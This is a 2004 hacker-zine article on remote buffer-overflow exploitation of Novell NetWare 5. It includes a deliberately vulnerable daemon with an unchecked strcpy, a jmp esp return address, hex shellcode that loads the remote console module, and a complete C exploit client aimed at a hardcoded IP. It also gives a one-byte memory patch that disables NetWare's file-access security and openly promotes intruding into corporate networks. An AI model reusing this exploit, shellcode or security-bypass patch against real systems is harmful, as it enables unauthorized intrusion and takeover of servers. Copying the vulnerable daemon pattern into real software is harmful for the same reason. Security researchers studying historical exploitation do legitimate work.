@@ -1,0 +1,437 @@
+                                                               _   _:.
+                                                                :$$$$$
+         _   .     - +.                                        :l$³³$$
+   s¿¿,,_  +:@QSSS$$$$$                                         ``
+   $$$$$$$$bs¿.`"Ù?$$$l      [ New look at Novell Netware ] 
+   'ÀÀ?$$³$$$$b¿_  .       [ without fucking "(tm)" ]
+            `"À$³$b.   .    [ free_hunter ]
+                  `À?b.  `.   
+                     `Ù.   +
+                      `$   _.
+                        `
+
+
+    Since version 5.0,novell netware has native support of tcp/ip protocol, and
+ also  has  enough  various  internet  services,  so  its open many new ways of
+ netware  exploitation.  However, from 1998 year when was release of netware 5,
+ to nowdays, no one of exploits with running arbitrary code exist. Yep, bugtraq
+ list contained description of many vulnerabilities but they all about DoS with
+ "probably exploitable".
+
+    Probably, its becouse novell netware was designed as highly productive file
+ server,  now its also no global changes in design but added more functionality
+ like  java  support,  X-server, envrioment for developer etc. Some words about
+ common  functions, there are two ways to access netware, the first one is via 
+ the file server device using NCP (netware core protocol, like smb or nfs), and
+ is  more  powerfull,except  normally to create/delete/modify a file system, it
+ has procedures to manage users/printers/etc. Second way is  to access  netware
+ via  server system console, on server console u can manage file subsystem, add
+ devices, load NLM-s(Netware Loadable Module), and more things. Server  console
+ accessible  via  keyboard  or  remote,  if rconsole.nlm is loaded. Rconsole is
+ protected by a password entered when u load it. 
+
+ Feature  of  arhitecture  design, is that on server console, access levels not
+ exist,u  may  load  and  unload  any  modules. So there is no sense of local 
+ privilege escalation. But on programming level yet operation system user space
+ and  kernel  space,  to user space loading normally modules, kernel consist of
+ server.nlm  with  control  structures,it extracts from server.exe when netware
+ starts.
+
+    So, lets start doing  smth amazing :P like get access to console via remote
+ buffer  overflow. For compilation NLMs we will use WATCOM compiler and headers
+ from netware SDK. expample of .bat file u may see in bonus.
+
+ Simple network daemon looking like this :
+
+----------------------------------------------------------------------
+#define N_PLAT_WNT4
+#define N_ARCH_32
+#include <stdlib.h>
+#include <stdio.h> 
+#include <ntypes.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#define PASSOK "NETWARE"
+
+int res=0;
+
+int authit(char *p){
+    char pass[32];
+
+    strcpy(pass,p+5);
+    if (strncmp(pass,PASSOK,strlen(PASSOK))==0){res=1;};
+
+//    EnterDebugger();
+    return res;
+};
+
+
+
+int main() { 
+    struct sockaddr addr;
+    int addrlen;
+    int s,s2; 
+    char auth[]="AUTH PLZ!\n";
+    char buf[256];
+
+
+    if((s=socket(AF_INET, SOCK_STREAM, 0))<0) {
+        printf("socket err\n");
+        return -1;
+    }
+
+    addrlen=sizeof(addr);
+    memset(&addr, 0, addrlen);
+    addr.sa_family=AF_INET;
+
+    memset(addr.sa_data,0,sizeof(addr.sa_data));
+    addr.sa_data[0]=0x07;       //port 2000
+    addr.sa_data[1]=0xd0;
+    
+    printf("do bind\n");
+
+    if(bind(s, (struct sockaddr *)&addr, addrlen)){
+        printf("bind err\n");
+        return -1;
+    };
+
+    printf("do listen\n");
+
+    if ( listen(s, 5) ) {
+        printf("listen err\n");
+        return -1;
+    };
+
+    printf("do accept\n");
+
+    while(1){
+        
+        if((s2=accept(s, (struct sockaddr *)&addr, &addrlen))<0) {
+                printf("accept\n");
+                return -1;
+        }
+        
+        printf("client connected\n");
+        
+        memset(buf,0,sizeof(buf));
+        
+        send(s2,auth,sizeof(auth),0);
+        recv(s2,buf,256,0);
+        
+        printf("USER DATA: %s",buf);    
+        
+        if (strncmp(buf,"AUTH ",5)==0){
+            if (authit(buf)){ 
+            printf("AUTH PASSED !\n");
+            send(s2,"AUTH PASSED !\n",14,0);
+        }else {
+            printf("AUTH FAILED !\n");
+            send(s2,"AUTH FAILED !\n",14,0);
+        };
+        }else{
+            printf("BAD protocol \n");
+            send(s2,"BAD protocol \n",14,0);
+        };
+            
+        close(s2); 
+    };
+    close(s); 
+
+    return 0;
+}
+----------------------------------------------------------------------
+
+    As you see,programing for netware compatible with posix standarts with some
+ exception  (sockaddr  for  example).  For  enter  to netware debugger from the
+ system  console press and hold the following keys <left shift>, <right shift>,
+ <alt>,and then press <esc>. Or also possible use int3 in programm for enter in
+ it. When u enter to debuger all other process in netware will be hold.So enter
+ to debug from remote console not good idea :).
+
+    Description about nlm modules format u may see in [1]. When module loading,
+ it doing by following command:
+
+ NOVELL: load nlm_name argv 
+
+ operation  system  dynamically  allocate  some  memory  pages, in which module
+ loaded.  Netware  used  protection  mode  with  flat model, but in contrast to
+ linux,  module  address  space always different and not may intersect, so each
+ module  loaded in random memory space reserved for user space <d8000000, stack
+ allocation  doing  via  malloc  also in random memory space. Apart of this all
+ modules  which  needed  for netware stable working, like clib.nlm,threads.nlm,
+ also  after each restart loading in different addresses, linking with him when
+ new  module  loading,  doing  by  use for it .reloc and .fixup tables from nlm
+ header.
+
+    As u see, in this case, we have some  problem with remote bof exploitation,
+ since  we not  know stack  address  where our  shellcode lie, for solve it its
+ possible to use win32  shellcode tehnique, when impossible  send stack address
+ coz  it  have nulls,for solve it win32 shellcode writers must find in programm
+ code or in loaded programm`s library code, part of assembler code that do jump
+ or call on esp, since we known where in address space loaded win32 program and
+ her  library  it  will  worked,  more  detailed  about this u may read in [2].
+ Conformably to netware, possible use  kernel space aka server.nlm  code space,
+ which always loaded on static address, 0xfc000000.
+
+ For searching u may use netware debugger,
+
+ :m fc000000 ff e4
+
+ fc427885       "\xff\xe4"         ;     jmp esp
+
+ So, on address fc427885 locate need for our opcode bytes combination. Now, its
+ enougth to  place that  address as back  address for ret,  since ret do esp+4, 
+ execution will be continued in stack. Visually its look like:
+
+                                <---- stack grown 
+                                -----> address grown
+                         esp before ret executed
+                          |
+                          |   
+              ...RETRETRET|RET|OURCODE..
+
+ for successfully exploitation, only needed to known exactly buffer size, in 
+ order to execution continues with code but not with another ret address :). 
+
+    Next step, its create code for execution, for it needed to known how system
+ calls  in netware work, when for creation nlm was used C compiler, all syscall
+ pointed  to corresponding calls in clib.nlm or threads.nlm, which as i mention
+ loaded on random addresses. For exapmle :
+
+ fopen:
+
+     push acces_perm        // 4           
+     push filename          // 4
+     call clib.nlm|fopen
+     add esp,00000008       // back stack
+
+   But they in most cases are stubs and needed for various checking and sanity,
+ after  which  function  in  server.nlm  will  called. In netware like in win32
+ systems not used interrupts, except for drivers and so on purposes.
+   As u maybe guess,most simple way to get netware control, is a execute remote
+ console  module  on  port and pass what u choise, its possible to do via argv.
+ After examination and debugging i found for function server.nlm|LoadModule its
+ best  for  our aims, its located on permanent for netware 5 address 0xfc047244
+ and called like that :
+
+
+             "\x52"                      // push edx - NULL
+             "\x53"                      // push ebx - argv with  NULL at end
+             "\x50"                      // push eax - argv[0] modulename
+             "\xb8\x44\x72\x04\xfc"      // mov eax,0xfc047244  // loadmodule
+             "\xff\xd0"                  // call eax
+
+    For  correctly  exit  after   execution,   needed   to   know   address  of
+ threads.nlm|ExitThread  function, simple  way is found in program code  offset
+ from  code  begin  to  exit  call.  So  after  code  loaded  and  addresses to
+ clib.nlm/threads.nlm  was  setuped,  we  can  use  it. Address on which module
+ loaded  in  most case stored in part of stack that pointed by ebp. Ebp in that
+ example  of  daemon,setuped in _cstart procedure, before jump on main. For our
+ daemon offsets for exit call equal to 0x1ad.
+
+"\x4d"                   // dec ebp    
+"\x4d"                   // dec ebp
+"\x4d"                   // dec ebp
+"\x4d"                   // dec ebp
+"\x8b\x45\x04"           //mov eax,[ebp+4] //ebp+0 null byte, use ebp+4
+"\x45"                   // inc ebp
+"\x45"                   // inc ebp
+"\x45"                   // inc ebp
+"\x45"                   // inc ebp
+                                        //add eax,0x1ad
+"\xbb\xff\xff\xff\xff"   //mov ebx,0xFFFFFFFF
+"\xb9\x52\xfe\xff\xff"   //mov ecx,0xFFFFFE52
+"\x29\xcb"               //sub ebx,ecx
+"\x01\xd8"               //add eax,ebx
+
+"\xff\xe0"               //jmp eax
+
+
+So lets do its fucking exploit for our sample daemon ! :)                        
+
+----------------------------------------------------------------------
+
+#define N_PLAT_WNT4
+#define N_ARCH_32
+#include <stdlib.h>
+#include <stdio.h> 
+#include <ntypes.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#define DORET  "\x85\x78\x42\xfc"
+#define BOFBUF 32
+#define ALIGN  5
+
+char payload[]=
+             "\xba\xff\xff\xff\xff"      // mov edx,0xffffffff
+             "\x42"                      // inc edx
+             "\x52"                      // push edx
+             "\x68\x6e\x6c\x6d\x20"      // push 0x206D6C6E    //nlm 
+             "\x68\x61\x67\x36\x2e"      // push 0x2E366761    //ag6.
+             "\x68\x72\x63\x6f\x6e"      // push 0x6E6F6372    //rcon
+             "\x89\xe0"                  // mov eax,esp
+             "\x52"                      // push edx
+             "\x68\x36\x38\x30\x30"      // push 0x30303836    //6800
+             "\x68\x34\x20\x20\x31"      // push 0x31202034    //4  1
+             "\x68\x20\x32\x30\x33"      // push 0x33303220    // 203
+             "\x68\x74\x65\x73\x74"      // push 0x74736574    //test
+             "\x68\x6e\x6c\x6d\x20"      // push 0x206D6C6E    //nlm 
+             "\x68\x61\x67\x36\x2e"      // push 0x2E366761    //ag6.
+             "\x68\x72\x63\x6f\x6e"      // push 0x6E6F6372    //rcon
+             "\x89\xe3"                  // mov ebx,esp
+             "\x52"                      // push edx
+             "\x53"                      // push ebx
+             "\x50"                      // push eax
+             "\xb8\x44\x72\x04\xfc"      // mov eax,0xfc047244  // loadmodule
+             "\xff\xd0"                  // call eax
+             "\x4d"                      // dec ebp
+             "\x4d"                      // dec ebp
+             "\x4d"                      // dec ebp
+             "\x4d"                      // dec ebp
+             "\x8b\x45\x04"              // mov eax,[ebp+4]
+             "\x45"                      // inc ebp
+             "\x45"                      // inc ebp
+             "\x45"                      // inc ebp
+             "\x45"                      // inc ebp
+                                                       //add eax,0x1ad
+             "\xbb\xff\xff\xff\xff"      //mov ebx,0xFFFFFFFF
+             "\xb9\x52\xfe\xff\xff"      //mov ecx,0xFFFFFE52
+             "\x29\xcb"                  //sub ebx,ecx
+             "\x01\xd8"                  //add eax,ebx
+
+             "\xff\xe0"                  //jmp eax
+             ;
+
+
+int main() { 
+    struct sockaddr addr;
+    int addrlen;
+    int s,i; 
+    char tmpbuf[256];
+    char baf[256]="AUTH ";
+
+
+
+    if((s=socket(AF_INET, SOCK_STREAM, 0))<0) {
+        printf("socket#1");
+        return -1;
+    }
+
+    addrlen=sizeof(addr);
+    memset(&addr, 0, addrlen);
+
+    addr.sa_family=AF_INET;
+
+    addr.sa_data[0]=0x07;  //port 
+    addr.sa_data[1]=0xd0;
+
+    addr.sa_data[2]=0xac;  //address
+    addr.sa_data[3]=0x11;
+    addr.sa_data[4]=0x01;
+    addr.sa_data[5]=0xfa;
+    
+    printf("do connecting..\n");
+
+    if( connect(s, (struct sockaddr *)&addr, addrlen) <0 ){
+        printf("connected#1\n");
+        return -1;
+    };
+
+    printf("connect\n");
+
+    memset(tmpbuf,0,sizeof(tmpbuf));
+    recv(s,tmpbuf,256,0);
+    printf("SRV ANSW: %s",tmpbuf);    
+
+    for (i=0;i<BOFBUF+4;i=i+4){
+         memcpy(baf+ALIGN+i,DORET,4);
+    };
+    memcpy(baf+ALIGN+BOFBUF+4,payload,strlen(payload));
+
+    send(s,baf,sizeof(baf),0);
+
+    memset(tmpbuf,0,sizeof(tmpbuf));
+    recv(s,tmpbuf,256,0);
+    printf("SRV ANSW: %s",tmpbuf);    
+    
+    close(s); 
+
+    return 0;
+}
+
+----------------------------------------------------------------------
+
+    Version for linux you may found in bonus. As mention upper,except access to
+ console, netware have privilege levels system for access to files,for abuse it
+ enougth change  one byte in system memory. In netware 5.0  needed just  search 
+ next byte pattern:
+
+                           74 f1 88 da 81 e2 ff 00 00 00 
+
+ around  all memory and change  74 on 75 (jz/jnz). Addresses/pattern for  other 
+ netware versions may be finded in [3]. in debugger its doing by following way:
+
+ : m 0 74 f1 88 da 81 e2 ff 00 00 00
+  <address>74 f1 88 da 81 e2 ff 00 00 00
+
+ : c address = 75
+
+    Include this search  which shutdown all security subsystem in netware(after
+ this  change  needed  only  know  username, which have standart names as guest
+ admin  etc, for succcessfull auth)  in our shellcode not seems as be possible,
+ becouse of  impossible  search  of whole memory, coz of after trying access to
+ unmaped page page fault exception will be rised  and process  suspended.  This
+ problem may be solved in some ways,like setup selfexception handler,find table
+ with all maped page enumeration,also its possible to write it not in shellcode
+ but write special nlm, for that purpose.
+
+    If discuss about heap  overflow vulnerabilities, so may say with confidence
+ that,  without recive additional infos from program structures, (that possible
+ in  openssl  for  example),  do smth usefull with it impossible. It is becouse
+ algorithm  of heap allocation, chunk structure contained RED ZONE field, its 4
+ byte  pointer  on 4kb page border on which memory was allocated. Together with
+ impossible to predict in which memory region data will allocated, it do strong
+ safe about remote heap overflows. However, also if we know memory region where
+ chunk  allocated, its possible onle decrement to one byte, or increase on size
+ of  freed  chunk,  mostly any byte in system. If anybody interesting in it and
+ want to do further research, bonus have some work material about this theme.
+
+    Some words about cases  in that it may be usefull to use buffer overflow in
+ netware.  Above  all,  very  usefull  do it for intrude in corporate lan`s, in
+ which  by  an  oversight leaved netware server opened from internet, or use it
+ like  pop3/smtp/web/ftp  server  :)  In this case getting remote console on it
+ server,  allow load socks/proxy module for continue expansion in corporate lan
+ :)   Apart of this, with support of tcp/ip, appeared possibility to access ncp
+ functions  not  only  via  SPX  (that  not  route  on  default by cisco across
+ segments) but and via tcp/udp 524 port, and so now u may mount netware volumes
+ and  from  another  segment,  and  from any place in internet ;)Also ,ncp have
+ vulnerabilities  that  allow  unauthed intruders get list of all system users,
+ more  detailed  about  this  in [4].And exist implementation for linux [5] for
+ mount netware volumes via ncp with udp as transport protocol.
+
+ All of this give creative peoples huge space for researching ;)
+
+ Links:
+
+ [1] http://www.xs4all.nl/~itsme/projects/sources/nlm.c 
+ [2] http://www.phrack.org/show.php?p=55&a=15 
+ [3] http://www.void.ru/content/875
+ [4] http://razor.bindview.com/tools/files/ncpquery-1.2.tgz
+ [5] ftp://platan.vc.cvut.cz/pub/linux/ncpfs
+                  
+ P.S. All  mentioned in article  trademarks of  Novell Netware corp.  specially 
+ omitted and ignored.
+
+ PS2. Author do not responsibility for ^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H 
+ absolutly dont care who, how and with purposes will use it, and also dont care
+ about any consequences, which may be caused. However, author care about stupid
+ idiots which writes a lot of craps about responsibility.
+ 
+                                        don`t care 
+                                                be clever 
+                                                        stay cool
+
+
+                             freehunt//x25zine, 2004
